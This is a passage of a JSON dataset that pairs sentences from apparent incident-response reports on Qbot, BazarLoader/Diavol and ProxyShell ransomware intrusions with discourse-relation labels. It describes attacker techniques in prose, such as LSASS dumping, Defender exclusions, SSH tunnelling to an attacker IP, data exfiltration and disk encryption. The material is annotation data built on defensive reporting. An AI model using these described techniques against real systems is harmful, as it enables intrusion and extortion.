        "S2": "To keep up to date on current Qbot C2 endpoints you can check out our Threat Feed & All Intel service as we track these changing lists daily.",
        "relation": "MISC"
    },
    {
        "S1": "The QBot dll was executed on the system and shortly after, injected into the msra.exe process.",
        "S2": "This scheduled task was created by the msra.exe process, to be run only once, a few minutes after its creation.",
        "relation": "NEXT"
    },
    {
        "S1": "The QBot dll was executed on the system and shortly after, injected into the msra.exe process.",
        "S2": "QBot was observed injecting into msra.exe process on multiple systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A scheduled task was created by Qbot to escalate to SYSTEM privileges.",
        "S2": "Multiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected.",
        "relation": "MISC"
    },
    {
        "S1": "QBot was observed injecting into msra.exe process on multiple systems.",
        "S2": "You can review a in-depth analysis of the modules of this malware in this Checkpoint report.",
        "relation": "MISC"
    },
    {
        "S1": "Multiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected.",
        "S2": "Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Multiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected.",
        "S2": "With this type of setup the list of C2 from October 2021, has in large rotated out of use.",
        "relation": "MISC"
    },
    {
        "S1": "The newly dropped dll was then executed and process injected into msra.exe.",
        "S2": "dll files dropped by Qbot, were deleted after injection into msra.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "LSASS was accessed by Qbot, with the intention of accessing credentials.",
        "S2": "Additional evidence of LSASS access was visible in API calls from Qbot injected processes to LSASS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following discovery commands where observed coming from the Qbot processes.",
        "S2": "Qbot moved laterally to all workstations in the environment by copying a dll to the machine and then remotely creating a service to execute the Qbot dll.",
        "relation": "NEXT"
    },
    {
        "S1": "Qbot moved laterally to all workstations in the environment by copying a dll to the machine and then remotely creating a service to execute the Qbot dll.",
        "S2": "Qbot is widely known to steal emails with the intention of collecting information and performing email thread hijacking.",
        "relation": "MISC"
    },
    {
        "S1": "Qbot is widely known to steal emails with the intention of collecting information and performing email thread hijacking.",
        "S2": "Collection of browser data from Internet Explorer and Microsoft Edge was also observed with Qbot using the built-in utility esentutl.exe.",
        "relation": "LIST"
    },
    {
        "S1": "Qbot uses a tiered infrastructure, often using other compromised systems as first tier proxy points for establishing a constantly changing list of C2 endpoints.",
        "S2": "To keep up to date on current Qbot C2 endpoints you can check out our Threat Feed & All Intel service as we track these changing lists daily.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware (BazarLoader) was delivered to an endpoint via email, which included a link to OneDrive.",
        "S2": "Once the user executed the LNK file, the BazarLoader infection was initiated.",
        "relation": "NEXT"
    },
    {
        "S1": "As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig.",
        "S2": "The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host.",
        "relation": "NEXT"
    },
    {
        "S1": "As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig.",
        "S2": "Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually.",
        "relation": "NEXT"
    },
    {
        "S1": "After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL\u2019s on the beachhead.",
        "S2": "While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL\u2019s on the beachhead.",
        "S2": "Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead.",
        "S2": "The threat actor then moved laterally via RDP to a server that contained file shares.",
        "relation": "NEXT"
    },
    {
        "S1": "They then pivoted towards critical systems, such as domain controllers and a server that held backups.",
        "S2": "On the backup server, the threat actors attempted to dump databases associated with the backup solution.",
        "relation": "NEXT"
    },
    {
        "S1": "RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named \u201ckill.bat\u201d was executed on all of the targeted machines.",
        "S2": "From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.",
        "relation": "MISC"
    },
    {
        "S1": "The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host.",
        "S2": "BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host.",
        "S2": "We then observed threat actors dropping multiple Cobalt Strike Beacon DLL\u2019s on the host in the following file paths:",
        "relation": "MISC"
    },
    {
        "S1": "Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually.",
        "S2": "After the initial execution, the malware contacted two of its C2 IPs:",
        "relation": "MISC"
    },
    {
        "S1": "From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.",
        "S2": "After the initial execution, the malware contacted two of its C2 IPs:",
        "relation": "MISC"
    },
    {
        "S1": "From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.",
        "S2": "After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access was via a OneDrive link that arrived via malicious emails that was reported via @ankit_anubhav.",
        "S2": "The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named \u201cDocuments.lnk\u201d which executes the DLL via rundll32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon accessing the link, a zip file was downloaded.",
        "S2": "The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named \u201cDocuments.lnk\u201d which executes the DLL via rundll32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.",
        "S2": "The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named \u201cDocuments.lnk\u201d which executes the DLL via rundll32.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After the initial execution, the malware contacted two of its C2 IPs:",
        "S2": "The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL\u2019s activity.",
        "relation": "MISC"
    },
    {
        "S1": "We then observed threat actors dropping multiple Cobalt Strike Beacon DLL\u2019s on the host in the following file paths:",
        "S2": "After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.",
        "relation": "NEXT"
    },
    {
        "S1": "A new BITS job, named \u201cMicrosoft Office Manager upgrade v24.24\u201d was created on the beachhead host.",
        "S2": "While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.",
        "S2": "The threat actors made use of process injection through-out the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.",
        "S2": "We also observed the threat actor using Rubeus to kerberoast and asreproast the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.",
        "S2": "From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used PowerShell and cmd to automate the download and installation of AnyDesk.",
        "S2": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to install Anydesk for unattended access you have to set a password.",
        "S2": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.",
        "S2": "From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.",
        "S2": "The threat actors made use of process injection through-out the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors made use of process injection through-out the intrusion.",
        "S2": "During the course of the intrusion, we observed execution of the utility \u201cAdvanced IP Scanner\u201d to perform network scanning (over ports 21,80,445,4899,8080).",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors made use of process injection through-out the intrusion.",
        "S2": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named \u201cfodhelper_reg_hashes.bat\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike processes were also observed injecting into various other processes.",
        "S2": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named \u201cfodhelper_reg_hashes.bat\u201d.",
        "S2": "They also performed enumeration of the web browser information using more.",
        "relation": "NEXT"
    },
    {
        "S1": "They also performed enumeration of the web browser information using more.",
        "S2": "Using a well known technique documented on the Veeam backup forum, the threat actor managed to decrypt passwords used by Veeam.",
        "relation": "MISC"
    },
    {
        "S1": "Using a well known technique documented on the Veeam backup forum, the threat actor managed to decrypt passwords used by Veeam.",
        "S2": "Via RDP and notepad, they created a new file containing the code for the decryption routine.",
        "relation": "MISC"
    },
    {
        "S1": "The encryption method used by Veeam is Data Protection API/DPAPI.",
        "S2": "Execute, which gave the threat actors passwords that were used by Veeam.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All the activity was done using RDP on the server with backups.",
        "S2": "Via RDP and notepad, they created a new file containing the code for the decryption routine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We also observed the threat actor using Rubeus to kerberoast and asreproast the environment.",
        "S2": "During the course of the intrusion, we observed execution of the utility \u201cAdvanced IP Scanner\u201d to perform network scanning (over ports 21,80,445,4899,8080).",
        "relation": "MISC"
    },
    {
        "S1": "We also observed the threat actor using Rubeus to kerberoast and asreproast the environment.",
        "S2": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
        "S2": "The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
        "S2": "The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy.",
        "relation": "MISC"
    },
    {
        "S1": "The second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.",
        "S2": "Before execution of AdFind.exe, adf.bat was run.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the second day, the following commands were executed before they started working on moving laterally in the domain.",
        "S2": "Via RDP they manually ran @carlos_perez\u2018s Invoke-Sharefinder.ps1 on a server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the second day, the following commands were executed before they started working on moving laterally in the domain.",
        "S2": "After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the course of the intrusion, we observed execution of the utility \u201cAdvanced IP Scanner\u201d to perform network scanning (over ports 21,80,445,4899,8080).",
        "S2": "Comparing compiled version to executable from this intrusion",
        "relation": "MISC"
    },
    {
        "S1": "During the course of the intrusion, we observed execution of the utility \u201cAdvanced IP Scanner\u201d to perform network scanning (over ports 21,80,445,4899,8080).",
        "S2": "We also saw \u201cMSSQLUDPScanner.exe\u201d used for discovery of MSSQL instances across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "We believe the tool used is rvrsh3ll\u2019s MSSQLUDPScanner",
        "S2": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Comparing compiled version to executable from this intrusion",
        "S2": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.",
        "relation": "MISC"
    },
    {
        "S1": "After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.",
        "S2": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.",
        "relation": "NEXT"
    },
    {
        "S1": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
        "S2": "Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
        "S2": "The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
        "S2": "After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.",
        "relation": "NEXT"
    },
    {
        "S1": "After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.",
        "S2": "Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors attempted to dump a database using sqlcmd.exe but the connection to the MSSQL server failed.",
        "S2": "Here we can see the threat actor actively exfiltrating our information using FileZilla.",
        "relation": "NEXT"
    },
    {
        "S1": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.",
        "S2": "Here we can see the threat actor actively exfiltrating our information using FileZilla.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.",
        "S2": "On the third day, the threat actors began their final actions.",
        "relation": "NEXT"
    },
    {
        "S1": "Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.",
        "S2": "From a file server, the threat actors then established RDP connections to all the machines in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:",
        "S2": "On the third day, the threat actors began their final actions.",
        "relation": "NEXT"
    },
    {
        "S1": "On the third day, the threat actors began their final actions.",
        "S2": "They began with a ping sweep to locate all live hosts.",
        "relation": "MISC"
    },
    {
        "S1": "After that completed, they reviewed the results on the host.",
        "S2": "From the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors transferred 2 files onto the machines they connected to.",
        "S2": "From the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find.",
        "relation": "MISC"
    },
    {
        "S1": "A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.",
        "S2": "After completion of this activity, the ransomware binary was executed manually over the RDP connections.",
        "relation": "MISC"
    },
    {
        "S1": "We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells.",
        "S2": "Three web shells were spotted during our investigation:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells.",
        "S2": "After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells.",
        "relation": "NEXT"
    },
    {
        "S1": "We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells.",
        "S2": "On the third day, the next phase of the intrusion was underway.",
        "relation": "MISC"
    },
    {
        "S1": "We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells.",
        "S2": "Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager.",
        "relation": "NEXT"
    },
    {
        "S1": "Over the course of three days, three different web shells were dropped in publicly accessible directories.",
        "S2": "The threat actors repeated these tests twice over the first two days.",
        "relation": "MISC"
    },
    {
        "S1": "These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd.",
        "S2": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
        "relation": "MISC"
    },
    {
        "S1": "After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells.",
        "S2": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
        "relation": "MISC"
    },
    {
        "S1": "After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells.",
        "S2": "The threat actors repeated these tests twice over the first two days.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors repeated these tests twice over the first two days.",
        "S2": "Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups.",
        "relation": "MISC"
    },
    {
        "S1": "On the third day, the next phase of the intrusion was underway.",
        "S2": "A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups.",
        "S2": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then dropped Plink and established an SSH tunnel to expose RDP over the tunnel.",
        "S2": "Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager.",
        "relation": "NEXT"
    },
    {
        "S1": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
        "S2": "In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207).",
        "relation": "MISC"
    },
    {
        "S1": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
        "S2": "The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours.",
        "relation": "MISC"
    },
    {
        "S1": "They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk.",
        "S2": "Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder.",
        "relation": "NEXT"
    },
    {
        "S1": "Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder.",
        "S2": "Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations.",
        "relation": "NEXT"
    },
    {
        "S1": "A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.",
        "S2": "The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Thirty minutes later, the threat actor started using a domain administrator account.",
        "S2": "The threat actor also deployed the FRP package to these systems after gaining access.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor also deployed the FRP package to these systems after gaining access.",
        "S2": "In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207).",
        "relation": "MISC"
    },
    {
        "S1": "Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations.",
        "S2": "This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations.",
        "S2": "If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.",
        "relation": "MISC"
    },
    {
        "S1": "To encrypt workstations, an open source utility called DiskCryptor was utilized.",
        "S2": "The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours.",
        "S2": "This time we will talk about ProxyShell, which revealed itself around August 2021.",
        "relation": "MISC"
    },
    {
        "S1": "If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.",
        "S2": "The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.",
        "S2": "The threat actors executed a script named install-proxy.bat, containing the following lines of code:",
        "relation": "MISC"
    },
    {
        "S1": "This time we will talk about ProxyShell, which revealed itself around August 2021.",
        "S2": "It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once again, the vulnerability affects Microsoft Exchange servers.",
        "S2": "It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:",
        "S2": "The executable used is the current release of the installer for the utility DiskCryptor.",
        "relation": "MISC"
    },
    {
        "S1": "In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207).",
        "S2": "The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:",
        "S2": "The other two web shells were dropped upon the successful exploitation of ProxyShell.",
        "relation": "NEXT"
    },
    {
        "S1": "The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:",
        "S2": "We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that\u2019s why the parent process is w3wp.",
        "relation": "MISC"
    },
    {
        "S1": "Three web shells were spotted during our investigation:",
        "S2": "We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that\u2019s why the parent process is w3wp.",
        "relation": "MISC"
    },
    {
        "S1": "We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that\u2019s why the parent process is w3wp.",
        "S2": "This is the web shell code for login.aspx:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that\u2019s why the parent process is w3wp.",
        "S2": "We do not have a clear explanation for that behavior.",
        "relation": "MISC"
    },
    {
        "S1": "The other two web shells were dropped upon the successful exploitation of ProxyShell.",
        "S2": "Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors executed a script named install-proxy.bat, containing the following lines of code:",
        "S2": "The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:",
        "relation": "MISC"
    },
    {
        "S1": "It first stops and then deletes a task named CacheTask if it exists.",
        "S2": "CacheTask.bat is a script that loops the execution of the Fast Reverse Proxy (FRP) binary:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It then Creates a schedule task which will call an XML file which then executes CacheTask.bat",
        "S2": "They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:",
        "S2": "After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount.",
        "S2": "To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic.",
        "S2": "To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:",
        "relation": "MISC"
    },
    {
        "S1": "After activating the account, the threat actors set the password of this account to [email protected] and added it to Administrators and Remote Desktop Users groups.",
        "S2": "Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.",
        "S2": "The threat actors dumped LSASS process manually using the Task Manager CAR-2019-08-001:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.",
        "S2": "However, the threat actors performed masquerading with many of their tools:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.",
        "S2": "To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion.",
        "S2": "No data collection was observed in this intrusion.",
        "relation": "LIST"
    },
    {
        "S1": "To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:",
        "S2": "Using the dropped web shells, the threat actors performed the following commands:",
        "relation": "MISC"
    },
    {
        "S1": "To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:",
        "S2": "The threat actors only collected the dumped LSASS using a zip archive:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account.",
        "S2": "The threat actors also appeared to use Impacket\u2019s wmiexec to perform lateral movement on one of the domain controllers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also appeared to use Impacket\u2019s wmiexec to perform lateral movement on one of the domain controllers.",
        "S2": "The threat actors only collected the dumped LSASS using a zip archive:",
        "relation": "NEXT"
    },
    {
        "S1": "However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.",
        "S2": "We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.",
        "relation": "MISC"
    },
    {
        "S1": "However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.",
        "S2": "While this utility was not executed on any servers in the environment it was deployed to all the workstations.",
        "relation": "MISC"
    },
    {
        "S1": "No data collection was observed in this intrusion.",
        "S2": "No Command and Control frameworks were used during this intrusion.",
        "relation": "LIST"
    },
    {
        "S1": "The threat actors only collected the dumped LSASS using a zip archive:",
        "S2": "They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors only collected the dumped LSASS using a zip archive:",
        "S2": "In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide.",
        "relation": "NEXT"
    },
    {
        "S1": "No Command and Control frameworks were used during this intrusion.",
        "S2": "Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.",
        "relation": "LIST"
    },
    {
        "S1": "Threat actors created a SSH tunnel to 148.251.71[.]182 using plink in order to forward RDP access:",
        "S2": "We can conclude that those threat actors are used to this protocol tunneling technique.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We can conclude that those threat actors are used to this protocol tunneling technique.",
        "S2": "Use of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide.",
        "S2": "A binary called dcrypt.exe, was dropped on a backup server and immediately deleted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide.",
        "S2": "Both were executed via the threat actors after RDP login to each host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.",
